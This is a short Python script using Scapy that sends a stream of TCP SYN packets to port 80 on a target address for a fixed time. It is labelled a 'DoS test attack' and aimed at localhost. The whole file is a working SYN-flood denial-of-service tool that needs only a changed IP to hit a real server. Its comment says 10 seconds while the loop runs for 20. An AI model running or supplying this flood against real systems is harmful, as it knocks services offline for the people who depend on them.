from scapy.all import *
import time

def dos_attack():
    target_ip = "127.0.0.1"  # localhost for testing
    target_port = 80         # target port

    # Create a TCP SYN packet
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    packet = ip/tcp

    print("Starting DoS test attack...")
    start_time = time.time()
    
    # Send packets rapidly for 10 seconds
    while time.time() - start_time < 20:
        send(packet, verbose=False)
        # Small delay to not overwhelm your system
        time.sleep(0.001)
    
    print("DoS test completed")

if __name__ == "__main__":
    dos_attack()
